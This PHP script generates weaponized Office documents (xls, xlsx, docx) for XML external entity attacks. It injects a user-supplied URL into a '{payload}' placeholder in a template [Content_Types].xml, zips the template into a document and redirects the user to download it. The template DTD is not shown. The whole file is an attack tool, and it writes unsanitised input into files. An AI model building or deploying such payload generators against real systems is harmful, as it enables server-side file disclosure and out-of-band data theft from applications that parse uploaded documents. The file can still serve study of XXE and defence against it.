<?php
    require_once('../libs/pclzip.lib.php');
    $type = @$_GET['type'];
    $url = @$_GET['url'];
    $filename = md5(uniqid(microtime(true),true));
    // bug: $zipfile = "../tmp/{$filename}.{$type}";
    if($type == "xls"){
        $zipfile = "../tmp/{$filename}.xls";
    }elseif($type == "xlsx"){
        $zipfile = "../tmp/{$filename}.xlsx";
    }elseif($type == "docx"){
        $zipfile = "../tmp/{$filename}.docx";
    }else{
        die("You are sb!");
    }
    
    $website = "../vuln/xxe/{$type}";
    $xmlfile = "[Content_Types].xml";
    $content = file_get_contents("{$website}/$xmlfile");
    file_put_contents("{$website}/$xmlfile", str_replace("{payload}", $url, $content));
    $zip = new PclZip("{$zipfile}");
    $zip->create($website,PCLZIP_OPT_REMOVE_PATH,$website);
    file_put_contents("{$website}/$xmlfile", $content);
    header("Location: {$zipfile}");
?>
